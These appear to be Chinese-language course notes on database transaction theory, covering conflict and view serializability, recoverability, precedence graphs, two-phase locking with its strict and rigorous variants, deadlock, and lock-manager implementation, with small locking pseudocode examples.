<p><strong>基本假设</strong>：每个事务都能保持数据库的一致性。因此，一组事务的串行执行也能保持数据库的一致性。</p>
<p><strong>可串行化定义</strong>：如果一个（可能是并发的）调度与某个串行调度等价，则称该调度是可串行化的。</p>
<p>根据调度等价的不同形式，可串行化分为两种主要类型：</p>
<ol>
<li>
<p><strong>冲突可串行化（Conflict serializability）</strong></p>
<ul>
<li>基于操作之间的冲突关系</li>
<li>如果通过交换非冲突操作的顺序，可以将并发调度转换为串行调度，则该调度是冲突可串行化的</li>
</ul>
</li>
<li>
<p><strong>视图可串行化（View serializability）</strong></p>
<ul>
<li>基于事务"看到"的数据库状态</li>
<li>比冲突可串行化更宽松，但计算成本更高</li>
</ul>
</li>
</ol>
<p>首先，将事务操作简化，只考虑读写操作，忽略其他操作。</p>
<h3 id="note-db-transaction-conflict-serializability">Conflict Serializability<a class="headerlink" href="#note-db-transaction-conflict-serializability" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">冲突操作</p>
<p>指令 <span class="arithmatex">\(I_i\)</span> 和 <span class="arithmatex">\(I_j\)</span> 分别来自事务 <span class="arithmatex">\(T_i\)</span> 和 <span class="arithmatex">\(T_j\)</span>，当且仅当满足以下条件时它们发生冲突：</p>
<ol>
<li>它们来自不同的事务</li>
<li>它们访问相同的数据项 Q</li>
<li>至少有一个指令是写操作</li>
</ol>
<p>具体的冲突情况：</p>
<ol>
<li><span class="arithmatex">\(I_i = \text{read}(Q)\)</span>, <span class="arithmatex">\(I_j = \text{read}(Q)\)</span>：不冲突</li>
<li><span class="arithmatex">\(I_i = \text{read}(Q)\)</span>, <span class="arithmatex">\(I_j = \text{write}(Q)\)</span>：冲突</li>
<li><span class="arithmatex">\(I_i = \text{write}(Q)\)</span>, <span class="arithmatex">\(I_j = \text{read}(Q)\)</span>：冲突</li>
<li><span class="arithmatex">\(I_i = \text{write}(Q)\)</span>, <span class="arithmatex">\(I_j = \text{write}(Q)\)</span>：冲突</li>
</ol>
</div>
<p>直观上，两个操作之间的冲突会强制它们之间存在一个（逻辑）时间顺序。如果 <span class="arithmatex">\(I_i\)</span> 和 <span class="arithmatex">\(I_j\)</span> 在调度中是连续的且它们不冲突，那么即使在调度中交换它们的位置，结果也会保持不变。即不冲突交换仍不冲突，冲突不可交换；</p>
<div class="admonition note">
<p class="admonition-title">Conflict Serializability</p>
<p>如果一个调度 <span class="arithmatex">\(S\)</span> 可以通过一系列非冲突指令的交换转换为另一个调度 <span class="arithmatex">\(S'\)</span>，则称这两个调度是冲突等价的。</p>
<p>如果一个调度与某个串行调度冲突等价，则称该调度是冲突可串行化的。</p>
</div>
<figure>
<img alt="" src="../NOTE/DB/img/conflict_s.png" width="500" />

<figcaption>Conflict Serializability</figcaption>
</figure>
<p>这里Schedule3和Schedule4是冲突等价的，因为<span class="arithmatex">\(T_2\)</span>的<code>Read(A)</code>和<code>Wirte(A)</code>与<span class="arithmatex">\(T_1\)</span>的<code>Read(B)</code>和<code>Write(B)</code>不冲突，可以交换顺序；</p>
<figure>
<img alt="" src="../NOTE/DB/img/conflict_s1.png" width="500" />

<figcaption>Not Conflict Serializability</figcaption>
</figure>
<p>这里就不是冲突等价的，因为不能再<span class="arithmatex">\(T_3\)</span>读之前<span class="arithmatex">\(T_4\)</span>写<span class="arithmatex">\(Q\)</span>，也不能先<span class="arithmatex">\(T_3\)</span>写<span class="arithmatex">\(Q\)</span>再<span class="arithmatex">\(T_4\)</span>写<span class="arithmatex">\(Q\)</span>，所以这个Schedule既不等价于<code>&lt;T3,T4&gt;</code>，也不等价于<code>&lt;T4,T3&gt;</code>；</p>
<h3 id="note-db-transaction-view-serializability">View Serializability<a class="headerlink" href="#note-db-transaction-view-serializability" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">视图等价</p>
<p>如果两个调度 <span class="arithmatex">\(S\)</span> 和 <span class="arithmatex">\(S'\)</span> 满足以下条件，则它们是视图等价的：</p>
<ul>
<li>
<p><strong>首读</strong>：对于任何数据项 Q，如果事务 <span class="arithmatex">\(T_i\)</span> 在 <span class="arithmatex">\(S\)</span> 中第一个读取 Q 的初始值，那么 <span class="arithmatex">\(T_i\)</span> 也在 <span class="arithmatex">\(S'\)</span> 中第一个读取 Q 的初始值</p>
</li>
<li>
<p><strong>写读</strong>：对于任何数据项 Q，如果事务 <span class="arithmatex">\(T_i\)</span> 在 <span class="arithmatex">\(S\)</span> 中读取 Q 的值，这个 Q 的值是被 <span class="arithmatex">\(T_j\)</span> 写过的，那么再 <span class="arithmatex">\(S'\)</span> 中 <span class="arithmatex">\(T_i\)</span> 必须读取 <span class="arithmatex">\(Q\)</span> 的值是被 <span class="arithmatex">\(T_j\)</span> 写过的值</p>
</li>
<li>
<p><strong>末写</strong>：对于任何数据项 Q，如果事务 <span class="arithmatex">\(T_i\)</span> 在 <span class="arithmatex">\(S\)</span> 中最后写入 Q 的值，那么 <span class="arithmatex">\(T_i\)</span> 也在 <span class="arithmatex">\(S'\)</span> 中最后写入 Q 的值</p>
</li>
</ul>
</div>
<div class="admonition note">
<p class="admonition-title">View Serializability</p>
<p>如果一个调度 <span class="arithmatex">\(S\)</span> 可以通过一系列非冲突指令的交换转换为另一个调度 <span class="arithmatex">\(S'\)</span>，则称这两个调度是冲突等价的。</p>
<p>如果一个调度与某个串行调度冲突等价，则称该调度是冲突可串行化的。</p>
</div>
<figure>
<img alt="" src="../NOTE/DB/img/view_s.png" width="500" />

<figcaption>View Serializability</figcaption>
</figure>
<p>这里无法通过冲突等价到任何串行调度，但是通过视图等价可以等价为<code>&lt;T27,T28,T29&gt;</code>；</p>
<div class="admonition idea">
<p class="admonition-title">Idea</p>
<p>视图可串行化（View Serializability）是比冲突可串行化（Conflict Serializability）更宽松的条件。所有冲突可串行化的调度都是视图可串行化的，但反之则不成立。</p>
<div class="admonition note">
<p class="admonition-title">盲写（Blind Write）</p>
<p>盲写是指事务对数据项进行写操作，但在此之前没有读取该数据项。即事务直接覆盖了数据项的值，而不关心其原始值。</p>
</div>
<p><strong>重要结论</strong>：每个视图可串行化但不是冲突可串行化的调度都包含盲写操作。</p>
<p>在上面的例子中：</p>
<ul>
<li>T28 和 T29 都是盲写，它们在写入之前没有进行任何读操作</li>
<li>T29 的写操作覆盖了T28 和T27 的写操作，但是这没有任何冲突，因为T27和T28的写入并没有被读取；</li>
</ul>
<p>这种情况下，如果没有盲写，那么视图可串行化的调度必定也是冲突可串行化的。</p>
</div>
<h3 id="note-db-transaction-other-notions-of-serializability">Other Notions of Serializability<a class="headerlink" href="#note-db-transaction-other-notions-of-serializability" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/other_notions.png" width="500" />

<figcaption>Other Notions of Serializability</figcaption>
</figure>
<p>这个调度既不是冲突可串行化的，也不是视图可串行化的，但是它却是与先T1后T5的串行调度等价的；</p>
<h2 id="note-db-transaction-recoverability">Recoverability<a class="headerlink" href="#note-db-transaction-recoverability" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">可恢复调度(Recoverable Schedule)</p>
<p>如果一个调度 <span class="arithmatex">\( S \)</span> 满足以下条件，则称其为可恢复调度(Recoverable Schedule)：</p>
<p>对于调度中的每个事务 <span class="arithmatex">\( T_i \)</span>，如果 <span class="arithmatex">\( T_i \)</span> 读取了一个由事务 <span class="arithmatex">\( T_j \)</span> 写入的数据项，那么 <span class="arithmatex">\( T_i \)</span> 的提交操作必须出现在 <span class="arithmatex">\( T_j \)</span> 的提交操作之后。</p>
</div>
<figure>
<img alt="" src="../NOTE/DB/img/recoverable.png" width="500" />

<figcaption>Recoverable Schedule</figcaption>
</figure>
<p>在给定的调度中，如果 <span class="arithmatex">\( T_9 \)</span> 在读取后立即提交，而 <span class="arithmatex">\( T_8 \)</span> 随后中止，那么 <span class="arithmatex">\( T_9 \)</span> 可能已经读取并显示了一个不一致的数据库状态。因此，数据库必须确保调度是可恢复的，以避免这种不一致。</p>
<h3 id="note-db-transaction-cascade-rollback">Cascade Rollback<a class="headerlink" href="#note-db-transaction-cascade-rollback" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/cascade_rollback.png" width="500" />

<figcaption>Cascade Rollback</figcaption>
</figure>
<p>级联回滚是指一个事务失败会导致一系列事务的回滚。在给定的调度中，如果 <span class="arithmatex">\( T_{10} \)</span> 失败，那么 <span class="arithmatex">\( T_{11} \)</span> 和 <span class="arithmatex">\( T_{12} \)</span> 也必须回滚。这可能导致大量工作的撤销。</p>
<h3 id="note-db-transaction-cascade-free-schedule">Cascade-Free Schedule<a class="headerlink" href="#note-db-transaction-cascade-free-schedule" title="Permanent link">&para;</a></h3>
<p>无级联调度是指级联回滚不会发生。对于每对事务 <span class="arithmatex">\( T_i \)</span> 和 <span class="arithmatex">\( T_j \)</span>，如果 <span class="arithmatex">\( T_j \)</span> 读取了由 <span class="arithmatex">\( T_i \)</span> 写入的数据项，那么 <span class="arithmatex">\( T_i \)</span> 的提交操作必须出现在 <span class="arithmatex">\( T_j \)</span> 的读取操作之前。</p>
<p>每个无级联调度也是可恢复的。限制调度为无级联调度是理想的。</p>
<h2 id="note-db-transaction-implementation-of-isolation">Implementation of isolation<a class="headerlink" href="#note-db-transaction-implementation-of-isolation" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>一种只允许一个事务一次执行的策略会生成串行调度，但这提供了较差的并发度。为了保证数据库的一致性，调度必须是冲突可串行化或视图可串行化的，并且是可恢复的，最好是无级联的。</p>
</li>
<li>
<p>并发控制方案需要在允许的并发量和产生的开销之间进行权衡。一些方案只允许生成冲突可串行化的调度，而其他方案则允许生成不是冲突可串行化的视图可串行化调度。</p>
</li>
<li>
<p>这种权衡是数据库系统设计中的一个核心考虑因素，因为它直接影响到系统的性能和数据一致性。高并发性能够提高系统吞吐量，但可能增加维护数据一致性的复杂性和开销。</p>
</li>
</ul>
<h2 id="note-db-transaction-transaction-definition-in-sql">Transaction Definition in SQL<a class="headerlink" href="#note-db-transaction-transaction-definition-in-sql" title="Permanent link">&para;</a></h2>
<p>在SQL中，数据操作语言必须包含一个用于指定组成事务的一组操作的结构。</p>
<h3 id="note-db-transaction-sql-transaction">SQL Transaction<a class="headerlink" href="#note-db-transaction-sql-transaction" title="Permanent link">&para;</a></h3>
<p>在SQL中，事务是隐式开始的。当执行第一个SQL语句时，系统会自动开始一个新的事务。</p>
<h3 id="note-db-transaction-sql-transaction-end">SQL Transaction End<a class="headerlink" href="#note-db-transaction-sql-transaction-end" title="Permanent link">&para;</a></h3>
<p>SQL中的事务可以通过以下方式结束：</p>
<ol>
<li>
<p><strong>提交工作（Commit work）</strong>：</p>
<ul>
<li>提交当前事务并开始一个新的事务</li>
<li>语法：<code>COMMIT;</code></li>
</ul>
</li>
<li>
<p><strong>回滚工作（Rollback work）</strong>：</p>
<ul>
<li>导致当前事务中止</li>
<li>语法：<code>ROLLBACK;</code></li>
</ul>
</li>
</ol>
<h3 id="note-db-transaction-implicit-commit">Implicit Commit<a class="headerlink" href="#note-db-transaction-implicit-commit" title="Permanent link">&para;</a></h3>
<p>In almost all database systems, the default behavior is that each SQL statement is implicitly committed after successful execution. This means that each statement is treated as a separate transaction.</p>
<h3 id="note-db-transaction-closing-implicit-commit">Closing Implicit Commit<a class="headerlink" href="#note-db-transaction-closing-implicit-commit" title="Permanent link">&para;</a></h3>
<p>Implicit commit can be closed using database instructions. For example:</p>
<ul>
<li>在JDBC中，可以使用 <code>connection.setAutoCommit(false)</code> 来关闭自动提交功能</li>
<li>这样，多个SQL语句可以组成一个事务，直到显式调用 <code>COMMIT</code> 或 <code>ROLLBACK</code> 为止</li>
</ul>
<h2 id="note-db-transaction-testing-for-serializability">Testing for Serializability<a class="headerlink" href="#note-db-transaction-testing-for-serializability" title="Permanent link">&para;</a></h2>
<h3 id="note-db-transaction-precedence-graph">Precedence Graph<a class="headerlink" href="#note-db-transaction-precedence-graph" title="Permanent link">&para;</a></h3>
<p>优先图是一个有向图，其中顶点表示事务。如果两个事务冲突，并且一个事务(T1)先于另一个事务(T2)访问冲突的数据项(Q)，则在图中从一个事务(T1)指向另一个事务(T2)画一条弧。</p>
<figure>
<img alt="" src="../NOTE/DB/img/precedence_graph.png" width="500" />

<figcaption>Precedence Graph</figcaption>
</figure>
<h3 id="note-db-transaction-conflict-serializability-test">Conflict Serializability Test<a class="headerlink" href="#note-db-transaction-conflict-serializability-test" title="Permanent link">&para;</a></h3>
<p>一个调度是冲突可串行化的，当且仅当其优先图是无环的。可以通过拓扑排序获得可串行化顺序。</p>
<h3 id="note-db-transaction-view-serializability-test">View Serializability Test<a class="headerlink" href="#note-db-transaction-view-serializability-test" title="Permanent link">&para;</a></h3>
<p>优先图测试不能直接用于视图可串行化。检查调度是否视图可串行化是NP完全问题，但可以使用一些充分条件的实用算法。</p>
<h3 id="note-db-transaction-concurrent-control-and-testing-for-serializability">Concurrent Control and Testing for Serializability<a class="headerlink" href="#note-db-transaction-concurrent-control-and-testing-for-serializability" title="Permanent link">&para;</a></h3>
<p>并发控制协议允许并发调度，但确保调度是冲突/视图可串行化的，并且是可恢复和无级联的。并发控制协议通常不会在创建过程中检查优先图，而是施加一种规则来避免非可串行化的调度。不同的并发控制协议在它们允许的并发量和产生的开销之间提供不同的权衡。测试可串行化有助于我们理解为什么并发控制协议是正确的。</p></section><section class="print-page" id="note-db-concurrency" heading-number="2.2.1.12"><h1 id="note-db-concurrency-concurrency-control">Concurrency Control<a class="headerlink" href="#note-db-concurrency-concurrency-control" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 7583 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 15 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 7 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 26 分钟</p>
</div>
<h2 id="note-db-concurrency-lock-based-protocols">Lock-Based Protocols<a class="headerlink" href="#note-db-concurrency-lock-based-protocols" title="Permanent link">&para;</a></h2>
<p>可串行化调度是并发控制的基础；</p>
<p>数据项可以以两种模式锁定：</p>
<ul>
<li>Exclusive (X) mode: 数据项可以被读取和写入。X锁通过lock-X指令请求。</li>
<li>Shared (S) mode: 数据项只能被读取。S锁通过lock-S指令请求。</li>
</ul>
<p>写一个数据之前，需要先得到一个X锁，读一个数据之前，需要先得到一个S锁。操作结束之后，将这个锁释放。</p>
<p>锁请求由并发控制管理器处理。事务只有在请求被授予后才能继续执行。</p>
<p>S锁与S锁是兼容的，X锁其它锁不兼容.</p>
<p>如果请求的锁与其他事务已经持有的锁兼容，
则事务可以获得对数据项的锁。
任意数量的事务可以对一个数据项持有共享锁（S锁），
但如果任何事务对该数据项持有排他锁（X锁），则其他事务不能持有任何类型的锁。</p>
<p>如果锁不能被授予，请求锁的事务将被阻塞等待，
直到所有不兼容的锁被其他事务释放。
然后，锁才会被授予给等待的事务。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Example of a transaction performing locking</p>
<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-db-concurrency-__codelineno-0-1"></a><span class="k">lock</span><span class="o">-</span><span class="n">S</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-db-concurrency-__codelineno-0-2"></a><span class="k">read</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-db-concurrency-__codelineno-0-3"></a><span class="n">unlock</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-db-concurrency-__codelineno-0-4"></a><span class="k">lock</span><span class="o">-</span><span class="n">S</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-db-concurrency-__codelineno-0-5"></a><span class="k">read</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-db-concurrency-__codelineno-0-6"></a><span class="n">unlock</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-db-concurrency-__codelineno-0-7"></a><span class="n">display</span><span class="p">(</span><span class="n">A</span><span class="o">+</span><span class="n">B</span><span class="p">)</span>
</span></code></pre></div>
上面的锁定方式不足以保证可串行化 — 如果在读取A和B之间，A和B被更新了，那么显示的总和将是错误的。</p>
<p>锁定协议(Locking protocols)是所有事务在请求和释放锁时遵循的一组规则。锁定协议限制了可能的调度集合。</p>
<p><figure markdown="span">
<img alt="Deadlock" src="../NOTE/DB/img/deadlock.png" width="500" />
</figure></p>
<p>上图展示了一个死锁的例子：</p>
<ul>
<li>T3 持有 B 的 X 锁，并请求 A 的 X 锁</li>
<li>T4 持有 A 的 S 锁，并请求 B 的 S 锁</li>
</ul>
<p>T3 和 T4 都无法继续执行 — T4 执行 lock-S(B) 会导致它等待 T3 释放 B 上的锁，而 T3 执行 lock-X(A) 会导致它等待 T4 释放 A 上的锁。这种情况被称为死锁（deadlock）。</p>
<p>为了处理死锁，必须回滚 T3 或 T4 中的一个事务，并释放其持有的锁。</p>
<div class="admonition info">
<p class="admonition-title">deadlock &amp; starvation</p>
<p>死锁（deadlock）是指在并发系统中，两个或多个事务（或进程）相互等待对方释放资源，从而导致所有事务都无法继续执行的情况。具体来说，在一个死锁的情境中，每个事务都持有某些资源的锁，并请求其他事务持有的资源锁，而这些资源锁又无法被释放，因为持有它们的事务也在等待其他资源的释放。</p>
<p>死锁是大多数锁定协议中存在的问题，可以说是一种"evil"。除了死锁外，饥饿（starvation）也是可能发生的问题，特别是当并发控制管理器设计不良时。</p>
<p>饥饿的例子包括：</p>
<ul>
<li>一个事务可能正在等待对某个数据项的X锁，而同时有一系列其他事务请求并获得了对同一数据项的S锁，导致第一个事务无限期等待。</li>
<li>同一个事务由于反复遇到死锁而被多次回滚，无法完成执行。</li>
</ul>
<p>一个设计良好的并发控制管理器应该能够防止饥饿现象的发生，例如通过实现公平的锁分配策略或优先级机制来确保所有事务最终都能获得所需的锁并完成执行。</p>
</div>
</div>
<h3 id="note-db-concurrency-the-2pl-protocol">The 2PL protocol<a class="headerlink" href="#note-db-concurrency-the-2pl-protocol" title="Permanent link">&para;</a></h3>
<p>2PL协议(Two-Phase Locking)是一种用于并发控制的协议，它通过在事务执行过程中对锁的请求和释放进行限制，从而确保事务的执行顺序和结果的正确性。</p>
<p>2PL协议的执行过程可以分为两个阶段：</p>
<ol>
<li>
<p><strong>增长阶段（Growing Phase）</strong>：</p>
<ul>
<li>事务可以获取锁</li>
<li>事务不能释放锁</li>
</ul>
</li>
<li>
<p><strong>缩减阶段（Shrinking Phase）</strong>：</p>
<ul>
<li>事务可以释放锁</li>
<li>事务不能获取锁</li>
</ul>
</li>
</ol>
<p>该协议确保了冲突可串行化的调度。可以证明，事务可以按照它们的锁点（即事务获取其最后一个锁的时间点）的顺序进行串行化。</p>
<p>虽然2PL协议确保了冲突可串行化，但它并不能解决所有的并发控制问题：</p>
<ol>
<li>
<p><strong>死锁问题</strong>：2PL协议本身不能防止死锁的发生。当多个事务相互等待对方持有的锁时，仍然可能出现死锁情况。</p>
</li>
<li>
<p><strong>级联回滚问题</strong>：在标准的2PL协议下，如果一个事务回滚，可能导致其他已读取该事务修改数据的事务也必须回滚，这称为级联回滚（cascading rollback）。</p>
</li>
</ol>
<p>为了解决这些问题，有两种改进的2PL协议：</p>
<h4 id="note-db-concurrency-strict-2pl">Strict 2PL<a class="headerlink" href="#note-db-concurrency-strict-2pl" title="Permanent link">&para;</a></h4>
<p>严格两阶段锁协议要求事务持有所有排他锁（X锁）直到事务提交或中止。具体规则如下：</p>
<ul>
<li>事务必须按照2PL协议获取锁</li>
<li>事务持有的所有排他锁必须在事务结束（提交或中止）后才能释放</li>
</ul>
<p>Strict 2PL的主要优点是避免了级联回滚问题，因为其他事务无法读取未提交的修改数据。</p>
<h4 id="note-db-concurrency-rigorous-2pl">Rigorous 2PL<a class="headerlink" href="#note-db-concurrency-rigorous-2pl" title="Permanent link">&para;</a></h4>
<p>Rigorous 2PL比Strict 2PL更加严格，它要求事务持有所有锁（包括共享锁和排他锁）直到事务提交或中止：</p>
<ul>
<li>事务必须按照2PL协议获取锁</li>
<li>事务持有的所有锁（S锁和X锁）必须在事务结束（提交或中止）后才能释放</li>
</ul>
<p>Rigorous 2PL的主要优点是事务可以按照它们提交的顺序进行串行化，这提供了一种简单明确的串行化顺序。</p>
<p>在实际数据库系统中，通常采用Strict 2PL或Rigorous 2PL协议，因为它们不仅保证了可串行化，还避免了级联回滚问题，简化了恢复机制。</p>
<p>尽管2PL可能不是实现冲突可串行化的唯一方法，但它是一种通用且可靠的方法，特别是在没有关于事务访问模式的先验知识的情况下。这也解释了为什么2PL协议在实际数据库系统中被广泛采用。</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>虽然2PL协议可以保证生成冲突可串行化的调度，但需要注意的是：</p>
<ol>
<li>
<p><strong>并非所有冲突可串行化的调度都能通过2PL获得</strong>：</p>
<ul>
<li>存在一些冲突可串行化的调度，它们无法通过遵循2PL协议的事务执行来产生。</li>
<li>这意味着2PL协议在某种程度上限制了可能的调度集合。</li>
</ul>
</li>
<li>
<p><strong>2PL对于冲突可串行化的必要性</strong>：</p>
<ul>
<li>在没有额外信息（例如对数据访问的顺序）的情况下，2PL对于确保冲突可串行化是必要的。</li>
<li>这可以通过以下方式理解：如果事务Ti不遵循两阶段锁定协议，我们总能找到另一个遵循两阶段锁定的事务Tj，使得Ti和Tj的某个调度不是冲突可串行化的。(逆否)</li>
</ul>
</li>
</ol>
</div>
<h3 id="note-db-concurrency-lock-conversion">Lock Conversion<a class="headerlink" href="#note-db-concurrency-lock-conversion" title="Permanent link">&para;</a></h3>
<p>锁转换（Lock Conversion）是两阶段锁协议的一个扩展，允许事务在执行过程中动态地改变已持有锁的类型。这种机制增加了并发控制的灵活性，同时仍然保持可串行化的保证。</p>
<p>在带有锁转换的两阶段锁协议中：</p>
<ul>
<li>
<p><strong>第一阶段（获取阶段）</strong>：</p>
<ul>
<li>可以获取项目上的共享锁（S锁）</li>
<li>可以获取项目上的排他锁（X锁）</li>
<li>可以将共享锁（S锁）升级为排他锁（X锁）（Upgrade操作）</li>
</ul>
</li>
<li>
<p><strong>第二阶段（释放阶段）</strong>：</p>
<ul>
<li>可以释放共享锁（S锁）（Unlock操作）</li>
<li>可以释放排他锁（X锁）（Unlock操作）</li>
<li>可以将排他锁（X锁）降级为共享锁（S锁）（Downgrade操作）</li>
</ul>
</li>
</ul>
<p>这个协议确保了可串行化。但它仍然依赖于程序员正确插入各种锁定指令。</p>
<p>锁转换的主要优势在于：</p>
<ol>
<li><strong>提高并发度</strong>：允许事务根据实际需要调整锁的类型，避免不必要的严格锁定。</li>
<li><strong>减少死锁可能性</strong>：通过锁降级，可以在不完全释放锁的情况下减少对资源的独占，降低死锁风险。</li>
<li><strong>增强灵活性</strong>：事务可以根据操作的不同阶段调整锁的强度，更好地适应实际需求。</li>
</ol>
<h3 id="note-db-concurrency-automatic-acquisition-of-locks">Automatic acquisition of locks<a class="headerlink" href="#note-db-concurrency-automatic-acquisition-of-locks" title="Permanent link">&para;</a></h3>
<p>在实际的数据库系统中，事务通常不需要显式地发出锁请求，而是由系统自动处理锁的获取和释放。这种自动锁定机制简化了编程，并确保了事务的正确执行。</p>
<p>当事务Ti发出标准的读/写指令（没有显式的锁定调用）时，系统会自动处理锁定：</p>
<p><strong>读操作的处理</strong>：</p>
<p>当事务Ti执行<code>read(D)</code>操作时：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-db-concurrency-__codelineno-1-1"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">Ti</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">lock</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="k">then</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-db-concurrency-__codelineno-1-2"></a><span class="k">read</span><span class="p">(</span><span class="n">D</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-db-concurrency-__codelineno-1-3"></a><span class="k">else</span><span class="w"> </span><span class="k">begin</span><span class="w"> </span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-db-concurrency-__codelineno-1-4"></a><span class="k">if</span><span class="w"> </span><span class="n">necessary</span><span class="w"> </span><span class="n">wait</span><span class="w"> </span><span class="k">until</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">other</span><span class="w">  </span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-db-concurrency-__codelineno-1-5"></a><span class="k">transaction</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">lock</span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="k">then</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-db-concurrency-__codelineno-1-6"></a><span class="k">grant</span><span class="w"> </span><span class="n">Ti</span><span class="w"> </span><span class="n">a</span><span class="w">  </span><span class="k">lock</span><span class="o">-</span><span class="n">S</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">D</span><span class="p">;</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-db-concurrency-__codelineno-1-7"></a><span class="k">read</span><span class="p">(</span><span class="n">D</span><span class="p">)</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-db-concurrency-__codelineno-1-8"></a><span class="k">end</span>
</span></code></pre></div>
<h3 id="note-db-concurrency-implementation-of-locking">Implementation of Locking<a class="headerlink" href="#note-db-concurrency-implementation-of-locking" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>锁管理器通常被实现为一个独立的进程，事务向其发送锁定和解锁请求。锁管理器的工作流程如下：</p>
<ul>
<li>当收到锁请求时，锁管理器会回复一个锁授予消息（或在发生死锁的情况下，发送一个要求事务回滚的消息）</li>
<li>请求锁的事务会等待，直到其请求得到回应</li>
<li>锁管理器维护一个称为锁表（lock table）的数据结构，用于记录已授予的锁和待处理的请求</li>
</ul>
<p>锁表通常实现为一个内存中的哈希表，以被锁定的数据项的名称作为索引。
锁表中的每个条目通常包含：</p>
<ul>
<li>数据项标识符</li>
<li>锁类型（共享/排他）</li>
<li>持有锁的事务列表</li>
<li>等待该数据项锁的事务队列</li>
</ul>
<p><figure markdown="span">
<img alt="Lock Table" src="../NOTE/DB/img/lock_table.png" width="500" />
</figure></p>
<p>上图展示了一个锁表的示例。</p>
<p>新的请求会被添加到数据项请求队列的末尾，并且只有当它与所有早期锁兼容时才会被授予。</p>
